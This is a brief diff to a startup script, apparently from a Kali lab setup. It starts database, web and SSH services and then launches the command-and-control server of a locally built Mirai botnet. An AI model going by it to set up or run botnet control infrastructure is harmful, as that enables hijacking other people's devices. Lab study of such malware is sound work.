@@ -2,4 +2,10 @@
 sudo service mysql start
 sudo service apache2 start
 sudo service ssh start
+
+# setting path to Mirai source Folder
+pathToMirai=/home/kali/Desktop/myMirai/MiraiSourceCode
+export pathToMirai
+
+# launching cnc
 /home/kali/Desktop/myMirai/MiraiSourceCode/mirai/debug/cnc
